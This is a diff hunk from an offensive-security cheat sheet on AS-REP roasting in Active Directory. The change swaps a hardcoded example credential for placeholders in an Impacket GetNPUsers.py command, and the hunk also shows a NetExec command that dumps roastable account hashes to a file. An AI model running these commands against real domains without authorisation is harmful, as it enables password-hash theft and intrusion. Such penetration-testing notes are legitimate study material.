@@ -68,7 +68,7 @@ You have any valid domain credential. This lets you ask LDAP _which_ accounts ar
 ## <span style="color:#8BE9FD">Without BloodHound</span>
 ```bash
 # Impacket — -request auto-finds DONT_REQ_PREAUTH accounts and roasts them
-GetNPUsers.py '$DOMAIN/user:Password123' -request -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
+GetNPUsers.py '$DOMAIN/$USER:$PASS' -request -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
 
 # nxc
 nxc ldap $DC_IP -u $USER -p '$PASS' --asreproast as-rep.txt
